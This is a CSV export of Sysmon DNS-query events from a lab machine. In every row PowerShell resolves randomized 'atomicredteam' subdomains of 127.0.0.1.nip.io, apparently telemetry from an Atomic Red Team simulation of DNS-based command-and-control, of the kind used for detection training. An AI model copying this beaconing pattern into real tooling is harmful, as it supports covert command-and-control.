"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174677,"Query: atomicredteam-113346.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.143","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174678,"Query: atomicredteam-736300.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.181","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174679,"Query: atomicredteam-279546.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.219","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174680,"Query: atomicredteam-366974.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174681,"Query: atomicredteam-92527.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174683,"Query: atomicredteam-671784.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174684,"Query: atomicredteam-873949.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174685,"Query: atomicredteam-260795.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.831","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174686,"Query: atomicredteam-229138.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.868","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174687,"Query: atomicredteam-772427.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:34.906","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174688,"Query: atomicredteam-158095.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.233","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174689,"Query: atomicredteam-939539.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.280","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174690,"Query: atomicredteam-928792.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.319","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174691,"Query: atomicredteam-957936.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.487","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174692,"Query: atomicredteam-17770.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174693,"Query: atomicredteam-274976.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.563","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174694,"Query: atomicredteam-998851.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.601","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174695,"Query: atomicredteam-795643.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.639","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:35.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174696,"Query: atomicredteam-193704.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.677","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174697,"Query: atomicredteam-1423.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.716","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174698,"Query: atomicredteam-742832.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.754","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174699,"Query: atomicredteam-902248.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.949","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174700,"Query: atomicredteam-505340.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:35.986","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174701,"Query: atomicredteam-398651.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174702,"Query: atomicredteam-530619.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.061","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174703,"Query: atomicredteam-579935.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.099","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174704,"Query: atomicredteam-204981.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.278","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174705,"Query: atomicredteam-611058.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174706,"Query: atomicredteam-74363.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.355","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174707,"Query: atomicredteam-542421.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.393","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174708,"Query: atomicredteam-858167.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.431","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174709,"Query: atomicredteam-505400.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.470","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174710,"Query: atomicredteam-167185.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.639","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174711,"Query: atomicredteam-359413.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.677","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:36.790 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174712,"Query: atomicredteam-214406.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.714","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174713,"Query: atomicredteam-961818.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.752","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174714,"Query: atomicredteam-297466.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.791","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174715,"Query: atomicredteam-340876.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:36.828","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174716,"Query: atomicredteam-90237.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.003","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174717,"Query: atomicredteam-365114.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.042","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174718,"Query: atomicredteam-181424.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.080","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174719,"Query: atomicredteam-270471.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.117","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174720,"Query: atomicredteam-44641.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.434","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174721,"Query: atomicredteam-937070.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.472","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174722,"Query: atomicredteam-494334.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.511","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174723,"Query: atomicredteam-29154.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.692","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:37.803 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174724,"Query: atomicredteam-978635.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.732","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:38.814 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174725,"Query: atomicredteam-334058.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:37.771","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
